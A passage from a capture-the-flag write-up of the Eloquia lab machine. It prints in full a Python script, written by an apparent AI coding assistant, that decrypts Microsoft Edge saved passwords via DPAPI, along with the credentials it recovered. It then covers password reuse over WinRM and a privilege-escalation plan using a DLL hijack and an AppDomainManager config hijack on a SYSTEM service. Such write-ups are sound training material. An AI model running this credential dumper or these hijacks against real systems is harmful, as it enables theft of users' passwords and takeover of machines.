      298 -    enc_b64, aes_key = get_master_key(local_state)            
      299 -    print("[*] Encrypted AES key in Local State (base64):")   
      300 -    print("      %s" % enc_b64)                               
      301 -    print("[*] Decrypted master AES key (hex): %s" % aes_key.h
          -ex())                                                         
      302 -    print()                                                   
      129 +    if not os.path.isfile(local_state_path):                  
      130 +        print(f"[-] Local State not found: {local_state_path}"
          +)                                                             
      131 +        return 1                                              
      132 +    if not os.path.isfile(login_data_path):                   
      133 +        print(f"[-] Login Data not found: {login_data_path}") 
      134 +        return 1                                              
      135  
      304 -    any_rows = False                                          
      305 -    for profile, db in iter_login_dbs(user_data):             
      306 -        rows = dump_logins(db, aes_key)                       
      307 -        print("=" * 70)                                       
      308 -        print("Profile: %s   (%d entr%s)"                     
      309 -              % (profile, len(rows), "y" if len(rows) == 1 els
          -e "ies"))                                                     
      310 -        print("=" * 70)                                       
      311 -        for url, user, pw in rows:                            
      312 -            any_rows = True                                   
      313 -            print("URL:      %s" % url)                       
      314 -            print("Username: %s" % user)                      
      315 -            print("Password: %s" % pw)                        
      316 -            print("-" * 70)                                   
      317 -    if not any_rows:                                          
      318 -        print("[!] No stored logins found.")                  
      136 +    master_key = get_master_key(local_state_path)             
      137  
      138 +    # Copy the DB so we can read it even while Edge holds a lo
          +ck.                                                           
      139 +    tmp_dir = tempfile.mkdtemp(prefix="edge_")                
      140 +    tmp_db = os.path.join(tmp_dir, "Login Data.db")           
      141 +    try:                                                      
      142 +        shutil.copy2(login_data_path, tmp_db)                 
      143  
      321 -# ------------------------------------------------------------
          ---------------- #                                             
      322 -#  Self-test: NIST GCM AES-256 Test Case 16 (with AAD)        
      323 -# ------------------------------------------------------------
          ---------------- #                                             
      144 +        conn = sqlite3.connect(tmp_db)                        
      145 +        try:                                                  
      146 +            cursor = conn.cursor()                            
      147 +            cursor.execute(                                   
      148 +                "SELECT origin_url, username_value, password_v
          +alue FROM logins"                                             
      149 +            )                                                 
      150 +            rows = cursor.fetchall()                          
      151 +        finally:                                              
      152 +            conn.close()                                      
      153  
      325 -def selftest():                                               
      326 -    key = bytes.fromhex("feffe9928665731c6d6a8f9467308308"    
      327 -                        "feffe9928665731c6d6a8f9467308308")   
      328 -    nonce = bytes.fromhex("cafebabefacedbaddecaf888")         
      329 -    aad = bytes.fromhex("feedfacedeadbeeffeedfacedeadbeefabadd
          -ad2")                                                         
      330 -    ct = bytes.fromhex("522dc1f099567d07f47f37a32a84427d643a8c
          -dc"                                                           
      331 -                       "bfe5c0c97598a2bd2555d1aa8cb08e48590dbb
          -3d"                                                           
      332 -                       "a7b08b1056828838c5f61e6393ba7a0abcc9f6
          -62")                                                          
      333 -    tag = bytes.fromhex("76fc6ece0f4e1768cddf8853bb2d551b")   
      334 -    expected = bytes.fromhex("d9313225f88406e5a55909c5aff5269a
          -"                                                             
      335 -                             "86a7a9531534f7da2e4c303d8a318a72
          -"                                                             
      336 -                             "1c3c0c95956809532fcf0e2449a6b525
          -"                                                             
      337 -                             "b16aedf5aa0de657ba637b39")      
      338 -    pt = aes_gcm_decrypt(key, nonce, ct, tag, aad)            
      339 -    assert pt == expected, "AES-256-GCM self-test FAILED"     
      340 -    print("[+] AES-256-GCM self-test passed (NIST Test Case 16
          -).")                                                          
      154 +        print(f"[+] {len(rows)} credential row(s) found:\n")  
      155 +        for url, user, pw_blob in rows:                       
      156 +            password = decrypt_password(pw_blob, master_key)  
      157 +            print(f"URL:      {url}")                         
      158 +            print(f"Username: {user}")                        
      159 +            print(f"Password: {password}")                    
      160 +            print("-" * 60)                                   
      161 +    finally:                                                  
      162 +        shutil.rmtree(tmp_dir, ignore_errors=True)            
      163  
      164 +    return 0                                                  
      165  
      166 +                                                              
      167  if __name__ == "__main__":
      344 -    if "--selftest" in sys.argv:                              
      345 -        selftest()                                            
      346 -    else:                                                     
      347 -        main()                                                
      168 +    sys.exit(main())                                          

● Done. I wrote /home/oxdf/eloquia/edge_decrypt.py.

What it does
1. Prints the current username (from %USERNAME%).
2. Reads %LOCALAPPDATA%\Microsoft\Edge\User Data\Local State, prints the base64 os_crypt.encrypted_key, strips the 5-byte DPAPI prefix, and DPAPI-decrypts it to the master AES key (printed as hex).
3. Copies Default\Login Data to a temp file (so it reads even while Edge holds the lock), then for each row in logins prints URL / username / decrypted password.

Library choices (per "no special libraries") - ctypes → calls crypt32.CryptUnprotectData directly, so no pywin32 needed for DPAPI. - Crypto.Cipher.AES (pycryptodome, which you have) for AES-256-GCM. - sqlite3, json, base64, os, shutil, tempfile are all stdlib.

Password formats handled - v10/v11: [3-byte prefix][12-byte nonce][ciphertext][16-byte GCM tag], decrypted with the master key. - Legacy: whole blob passed back through DPAPI.

Running it (on the Windows host, as the profile owner): C:\PROGRA~1\Python311\python.exe edge_decrypt.py It must run as the user who owns the profile, since DPAPI ties the key to that user's credentials.

A couple of notes: - If the profile isn't Default (e.g. Profile 1), change the path in main(). - Recent Edge builds are moving some keys to app-bound encryption (APPB prefix instead of DPAPI), which needs the elevated/COM path and won't decrypt with plain CryptUnprotectData. This script handles the current DPAPI + v10/v11 scheme; if you hit an APPB key, let me know and I'll extend it.

Want me to add profile auto-discovery (loop over all Profile * dirs) or dump to CSV/JSON?

✻ Baked for 58s · done 8:17 AM
```

The resulting script makes use of the `Crypto.Cipher` package from the installed [PyCryptodome](https://www.pycryptodome.org/) package:

```python
#!/usr/bin/env python3
r"""
edge_decrypt.py - Decrypt Microsoft Edge "Login Data" on a Windows host.

Runs with only the Python standard library (ctypes, sqlite3, json, base64,
os, shutil) plus pycryptodome (the `Crypto` package) for AES-256-GCM.
No pywin32 required: DPAPI is called directly through ctypes/crypt32.

Decrypts the *current* user's own Edge credentials using that user's DPAPI
master key, so it must be run as the user who owns the profile.

Steps:
  1. Print the current username.
  2. Read Local State, print the base64 "app-bound"/encrypted AES key,
     then DPAPI-decrypt it to the master AES key (printed as hex).
  3. Read the Login Data SQLite DB and, for each row, print
     url / username / password.
"""

import base64
import ctypes
import ctypes.wintypes
import json
import os
import shutil
import sqlite3
import sys
import tempfile

from Crypto.Cipher import AES


# --------------------------------------------------------------------------- #
# DPAPI via ctypes (crypt32.CryptUnprotectData) - no pywin32 needed
# --------------------------------------------------------------------------- #
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char)),
    ]


def dpapi_decrypt(encrypted_bytes: bytes) -> bytes:
    """Decrypt a DPAPI blob for the current user (CRYPTPROTECT_UI_FORBIDDEN)."""
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    blob_out = DATA_BLOB()

    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),   # pDataIn
        None,                    # ppszDataDescr
        None,                    # pOptionalEntropy
        None,                    # pvReserved
        None,                    # pPromptStruct
        0x01,                    # dwFlags = CRYPTPROTECT_UI_FORBIDDEN
        ctypes.byref(blob_out),  # pDataOut
    )
    if not ok:
        raise ctypes.WinError()

    size = blob_out.cbData
    buf = ctypes.create_string_buffer(size)
    ctypes.memmove(buf, blob_out.pbData, size)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return buf.raw


# --------------------------------------------------------------------------- #
# Key / password handling
# --------------------------------------------------------------------------- #
def get_master_key(local_state_path: str) -> bytes:
    """Read Local State, print the stored b64 key, return the DPAPI-decrypted key."""
    with open(local_state_path, "r", encoding="utf-8") as fh:
        local_state = json.load(fh)

    b64_key = local_state["os_crypt"]["encrypted_key"]
    print(f"[+] Local State encrypted_key (base64):\n    {b64_key}\n")

    encrypted_key = base64.b64decode(b64_key)
    # Strip the 5-byte "DPAPI" prefix that Edge/Chrome prepend.
    if encrypted_key[:5] == b"DPAPI":
        encrypted_key = encrypted_key[5:]
    else:
        print("[!] Warning: 'DPAPI' prefix not found; attempting decrypt as-is.")

    master_key = dpapi_decrypt(encrypted_key)
    print(f"[+] Decrypted master AES key (hex):\n    {master_key.hex()}\n")
    return master_key


def decrypt_password(blob: bytes, master_key: bytes) -> str:
    """Decrypt a password_value blob (AES-256-GCM v10/v11, or legacy DPAPI)."""
    if not blob:
        return ""

    prefix = blob[:3]
    if prefix in (b"v10", b"v11"):
        nonce = blob[3:15]            # 12-byte IV
        ciphertext = blob[15:-16]     # payload
        tag = blob[-16:]              # 16-byte GCM auth tag
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode("utf-8", errors="replace")
        except Exception as exc:
            return f"<decrypt-failed: {exc}>"

    # Legacy format: the whole blob is a DPAPI blob.
    try:
        return dpapi_decrypt(blob).decode("utf-8", errors="replace")
    except Exception as exc:
        return f"<dpapi-decrypt-failed: {exc}>"


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def main() -> int:
    username = os.environ.get("USERNAME") or os.environ.get("USER") or "<unknown>"
    print(f"[+] Current user: {username}\n")

    local_appdata = os.environ.get("LOCALAPPDATA")
    if not local_appdata:
        local_appdata = os.path.join(r"C:\Users", username, r"AppData\Local")

    edge_user_data = os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
    local_state_path = os.path.join(edge_user_data, "Local State")
    login_data_path = os.path.join(edge_user_data, "Default", "Login Data")

    if not os.path.isfile(local_state_path):
        print(f"[-] Local State not found: {local_state_path}")
        return 1
    if not os.path.isfile(login_data_path):
        print(f"[-] Login Data not found: {login_data_path}")
        return 1

    master_key = get_master_key(local_state_path)

    # Copy the DB so we can read it even while Edge holds a lock.
    tmp_dir = tempfile.mkdtemp(prefix="edge_")
    tmp_db = os.path.join(tmp_dir, "Login Data.db")
    try:
        shutil.copy2(login_data_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        try:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            rows = cursor.fetchall()
        finally:
            conn.close()

        print(f"[+] {len(rows)} credential row(s) found:\n")
        for url, user, pw_blob in rows:
            password = decrypt_password(pw_blob, master_key)
            print(f"URL:      {url}")
            print(f"Username: {user}")
            print(f"Password: {password}")
            print("-" * 60)
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    return 0


if __name__ == "__main__":
    sys.exit(main())
```

I’ll upload it through Django, and run it:

```
C:\PROGRA~1\Python311>.\python.exe C:\Web\eloquia\static\assets\images\blog\edge_decrypt.py
[+] Current user: web

[+] Local State encrypted_key (base64):
RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABzr42Q+SDgR78a6A6x6z+EEAAAAB4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAAAAQZgAAAAEAACAAAABZqUTKi+3PgIqd3Qa3HRY2/JCmSDJLECa+TMtiB0cTPAAAAAAOgAAAAAIAACAAAAB0hEH7C3oQN6ghOwRl2cHGV2G3/o/oobqZ3Zm0uQNUhjAAAAAWtJnWT3GsY2PXsMOl66xYaMIXJodfrvLK5HVzFOvcGuw1CJn8xvbLF0LLyaOLujdAAAAA+vRmKffc2JdtiXx3o7Pvxy5CiU8YAuklDgNkgE+eAFDiAhBb5ZWr7zp30+GtPk4qluAXDrum+QHtuygfoywpTw==

[+] Decrypted master AES key (hex):
    c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444

[+] 4 credential row(s) found:

URL:      https://openai.com/
Username: olivia.kat
Password: <decrypt-failed: MAC check failed>
------------------------------------------------------------
URL:      http://eloquia.htb/accounts/login/
Username: Olivia.KAT
Password: S3cureP@sswdIGu3ss
------------------------------------------------------------
URL:      https://eloquia.htb/
Username: test
Password: testtest1234!
------------------------------------------------------------
URL:      https://chatgpt.com/
Username: olivia.kat
Password: S3cureP@sswd3Openai
------------------------------------------------------------
```

The first row fails to decrypt, likely because it was saved under a different key or is corrupted, but the other three come out fine.

### Shell

The password saved for the Eloquia website also works for Olivia.KAT over WinRM:

```rust
oxdf@hacky$ evil-winrm-py -i eloquia.htb -u olivia.kat -p 'S3cureP@sswdIGu3ss'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'eloquia.htb:5985' as 'olivia.kat'
evil-winrm-py PS C:\Users\Olivia.KAT\Documents>
```

## Shell as Administrator

### Enumeration

#### Olivia.KAT’s Files

Olivia.KAT has a few files on their desktop:

```
evil-winrm-py PS C:\Users\Olivia.KAT\Desktop> ls

    Directory: C:\Users\Olivia.KAT\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML
-a----        4/22/2024   7:02 AM            362 Todo.txt
```

`Todo.txt` shows hints about a service that’s under development:

```lua
[X] implement App.config file
[X] implement file type filtering
[] read firewall rules on service start
[] implement malicious input detection algorithm
[] avoid reading the whole "log" file on every service recall
-------------------------------
Problem: service is eating the CPU at huge log file size
Solution(temporary): Log rotation & service restart
```

The suggestion that the service is restarting opens an attack vector. Neither Olivia.KAT nor web is able to see any scheduled tasks that look related to this, but there still could be one.

`Logfile.PML` is a Process Monitor log file.

The `.lnk` file points to a directory in `Program Files`:

```powershell
evil-winrm-py PS C:\Users\Olivia.KAT\Desktop> $sh = New-Object -ComObject WScript.Shell
evil-winrm-py PS C:\Users\Olivia.KAT\Desktop> $sh.CreateShortcut("C:\Users\Olivia.KAT\Desktop\Failure2Ban - Prototype - Shortcut.lnk") | Select-Object TargetPath,Arguments

TargetPath                                                   Arguments
----------                                                   ---------
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype         
```

#### Failure2Ban - Prototype

This directory has a Visual Studio project:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype> ls

    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/1/2024   8:53 PM                Failure2Ban
-a----        4/23/2024   5:18 AM            923 Failure2Ban.sln
-a----        4/30/2024  12:55 AM          56832 Failure2Ban.v11.suo 
```

It’s a bit weird to find an in-development project in `Program Files`. `Failure2Ban.sln` has the project information:

```swift
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 2012
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Failure2Ban", "Failure2Ban\Failure2Ban.csproj", "{D9454C29-EC62-498C-BE61-B91ADE7CC3D8}"
EndProject
Global
        GlobalSection(SolutionConfigurationPlatforms) = preSolution
                Debug|Any CPU = Debug|Any CPU
                Release|Any CPU = Release|Any CPU
        EndGlobalSection
        GlobalSection(ProjectConfigurationPlatforms) = postSolution
                {D9454C29-EC62-498C-BE61-B91ADE7CC3D8}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
                {D9454C29-EC62-498C-BE61-B91ADE7CC3D8}.Debug|Any CPU.Build.0 = Debug|Any CPU
                {D9454C29-EC62-498C-BE61-B91ADE7CC3D8}.Release|Any CPU.ActiveCfg = Release|Any CPU
                {D9454C29-EC62-498C-BE61-B91ADE7CC3D8}.Release|Any CPU.Build.0 = Release|Any CPU
        EndGlobalSection
        GlobalSection(SolutionProperties) = preSolution
                HideSolutionNode = FALSE
        EndGlobalSection
EndGlobal
```

The code is in `Failure2Ban`:

```sql
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban> ls

    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/30/2024   1:37 PM                bin
d-----        4/30/2024   1:33 PM                obj
d-----        4/30/2024   1:33 PM                Properties
d-----        4/30/2024   1:33 PM                Service References
-a----        4/25/2024  11:32 AM            273 App.config
-a----        4/25/2024  11:20 AM           3828 Failure2Ban.csproj
-a----        4/25/2024  11:12 AM            589 Program.cs
-a----        4/23/2024   5:48 AM            446 ProjectInstaller.cs
-a----        4/23/2024   5:51 AM           1914 ProjectInstaller.Designer.cs
-a----        4/23/2024   5:48 AM           6416 ProjectInstaller.resx
------         5/1/2024   7:48 AM           6680 Service1.cs
-a----        4/23/2024   5:18 AM           1106 Service1.Designer.cs 
```

I could look at the details of what this project does, but I don’t need to. There’s a compiled binary in `bin\Debug`:

```sql
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban> ls bin\Debug

    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/14/2026  12:00 AM                Logs
-a----         5/1/2024   7:48 AM          13312 Failure2Ban.exe
-a----        4/30/2024   1:39 PM            283 Failure2Ban.exe.config
-a----        4/30/2024  12:55 AM          28160 Failure2Ban.pdb
-a----        4/30/2024  12:53 AM          22984 Failure2Ban.vshost.exe
-a----        4/25/2024  11:39 AM            273 Failure2Ban.vshost.exe.config
-a----         5/6/2022  10:20 PM            490 Failure2Ban.vshost.exe.manifest
```

The binary is running:

```
evil-winrm-py PS C:\> Get-Process Failure2Ban

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    268      15    11060      14812              5488   0 Failure2Ban
```

The process ID changes every few minutes:

```
evil-winrm-py PS C:\> Get-Process Failure2Ban

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    270      16    11332      14892              1172   0 Failure2Ban
```

That’s consistent with the `Todo.txt` file that said it’s restarting.

`Get-Process` can’t show the binary’s path from this user, but I can see the registry key that sets it up to run that binary as a service as `LocalSystem`:

```
evil-winrm-py PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\Failure2Ban

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Failure2Ban
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x2
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
    ObjectName    REG_SZ    LocalSystem
```

Olivia.KAT has read and write access over the `Debug` directory:

```r
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> icacls .
. ELOQUIA\Olivia.KAT:(I)(OI)(CI)(RX,W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

And over all the files in it:

```sql
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> icacls *
Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                BUILTIN\Users:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.exe.bk ELOQUIA\Olivia.KAT:(I)(RX,W)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   BUILTIN\Administrators:(I)(F)
                   BUILTIN\Users:(I)(RX)
                   ELOQUIA\Olivia.KAT:(I)(F)
                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.exe.config ELOQUIA\Olivia.KAT:(I)(RX,W)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Users:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.pdb ELOQUIA\Olivia.KAT:(I)(RX,W)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                BUILTIN\Users:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.vshost.exe ELOQUIA\Olivia.KAT:(I)(RX,W)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Users:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.vshost.exe.config ELOQUIA\Olivia.KAT:(I)(RX,W)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Administrators:(I)(F)
                              BUILTIN\Users:(I)(RX)
                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Failure2Ban.vshost.exe.manifest ELOQUIA\Olivia.KAT:(I)(RX,W)
                                NT AUTHORITY\SYSTEM:(I)(F)
                                BUILTIN\Administrators:(I)(F)
                                BUILTIN\Users:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Logs ELOQUIA\Olivia.KAT:(I)(OI)(CI)(RX,W)
     NT SERVICE\TrustedInstaller:(I)(F)
     NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
     NT AUTHORITY\SYSTEM:(I)(F)
     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
     BUILTIN\Administrators:(I)(F)
     BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
     BUILTIN\Users:(I)(RX)
     BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
     CREATOR OWNER:(I)(OI)(CI)(IO)(F)
     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 8 files; Failed processing 0 files
```

#### Logfile.PML

Trying to download the file with `evil-winrm-py` crashes:

```java
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> download C:\Users\Olivia.KAT\Desktop\Logfile.PML Logfile.PML
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/evil-winrm-py/lib/python3.12/site-packages/evil_winrm_py/evil_winrm_py.py", line 1644, in main
    interactive_shell(r_pool)
  File "/home/oxdf/.local/share/uv/tools/evil-winrm-py/lib/python3.12/site-packages/evil_winrm_py/evil_winrm_py.py", line 1258, in interactive_shell
    download_file(r_pool, remote_file, str(local_path))
  File "/home/oxdf/.local/share/uv/tools/evil-winrm-py/lib/python3.12/site-packages/evil_winrm_py/evil_winrm_py.py", line 751, in download_file
    line = json.loads(output[0])
                      ~~~~~~^^^
IndexError: list index out of range
```

It’s failing to read the file. Olivia.KAT should have access:

```
evil-winrm-py PS C:\Users\Olivia.KAT\Documents> icacls C:\Users\Olivia.KAT\Desktop\Logfile.PML
C:\Users\Olivia.KAT\Desktop\Logfile.PML NT AUTHORITY\SYSTEM:(I)(F)
                                        BUILTIN\Administrators:(I)(F)
                                        ELOQUIA\Olivia.KAT:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

But PowerShell is running in Constrained Language Mode (CLM), which PowerShell turns on automatically when AppLocker is enforcing script rules:

```
evil-winrm-py PS C:\Users\Olivia.KAT\Desktop> [IO.File]::ReadAllBytes("Logfile.PML").Length
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

`evil-winrm-py` ’s download relies on.NET methods like this to read the file, which is why it crashes.

I can copy it to the webserver:

```
evil-winrm-py PS C:\Users\Olivia.KAT\Desktop> copy Logfile.PML C:\Web\Eloquia\static\
```

And download it with `wget`:

```
oxdf@hacky$ wget eloquia.htb/static/Logfile.PML
--2026-10-12 18:13:13--  http://eloquia.htb/static/Logfile.PML
Resolving eloquia.htb (eloquia.htb)... 10.129.244.81
Connecting to eloquia.htb (eloquia.htb)|10.129.244.81|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1331957 (1.3M) [application/x-perfmon]
Saving to: ‘Logfile.PML’

Logfile.PML                       100%[===========================================>]   1.27M  7.30MB/s    in 0.2s    
2026-10-12 18:13:14 (7.30 MB/s) - ‘Logfile.PML’ saved [1331957/1331957]
```

I’ll open this file in a Windows VM in Process Monitor (from [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)). One quick thing to notice is that it’s loading a lot of DLLs from `SysWOW64`:

![image-20261014205151373](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/855e191ab0fa6912.png)

![image-20261014205151373](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261014205151373.webp)

This is a good sign that it wants 32-bit libraries. I can’t use PowerShell to check the architecture of the binary, but I can use `findstr`:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> findstr /c:'PE' Failure2Ban.exe
$PELKV2fà

         .I `@  `…ÔHW`P€
                        œ H.text4) * `.rsrcP`,@@.reloc
                                                      €2@BI'” P&¸b}(
```

A 32-bit binary will start `PEL`, whereas a 64-bit will start `PEd`. This one has a 32-bit header. For a.NET binary, that alone isn’t proof, as an “Any CPU” build (which the `.sln` file shows) also has a 32-bit header but runs as 64-bit on a 64-bit OS unless it’s flagged to prefer 32-bit. The `SysWOW64` loads in the Procmon log are what show that this one is actually running as a 32-bit process.

I’ll filter on file events where the result is “NAME NOT FOUND”:

![image-20261014204130516](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cd705bcceaa532bc.png)

![image-20261014204130516](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261014204130516.webp)

This gives all the times the binary tries to open a file that didn’t exist. I can add more filters to make sure `Failure2Ban - Prototype` is in the path:

![image-20261014204359772](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a65bbb6275c09f9f.png)

![image-20261014204359772](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261014204359772.webp)

Now there’s only one DLL:

![image-20261014204421861](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0477faa7fe974566.png)

![image-20261014204421861](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261014204421861.webp)

The binary looks for `VERSION.dll` in its own directory before finding it in `SysWOW64`. That’s a hijack opportunity. `VERSION.dll` isn’t in the KnownDLLs list, so Windows checks the application’s own directory before `SysWOW64`. Since Olivia.KAT can write to `bin\Debug`, I can drop a `VERSION.dll` there and the service will load it as SYSTEM.

### Privesc Overview

I’ll show three different ways to escalate here:

```
intendedunintendedShell as Olivia.KATModify
 Failure2Ban.exe.configLoad Malicious DLLShell as AdministratorIdentify Missing DLLDLL HijackOverwrite
Failure2Ban.exe
```

### Modifying Failure2Ban.exe.config

#### Strategy

In.NET binaries, there can be a `.exe.config` file that the CLR (Common Language Runtime) automatically reads at startup from the same directory as the executable. It’s plain XML and controls runtime behavior, such as supported.NET version, app settings, connection strings, and assembly loading directives.

One of these directives is `<appDomainManagerAssembly>` / `<appDomainManagerType>`, which tells the CLR to instantiate a custom `AppDomainManager` subclass before `Main()` runs. By editing the config to point at a malicious managed DLL, I can get code execution in the process’s context.

This works here because:

-   Olivia.KAT has `(RX,W)` on `Failure2Ban.exe.config`
    
-   The `.exe` is locked by the running process, but the `.config` is not, as it’s only read at startup
    
-   AppLocker DLL enforcement is off (`EnforcementMode: 0x0`), so the CLR can load the managed DLL
    
-   The service restarts periodically, so the modified config and malicious DLL will be picked up on the next restart
    

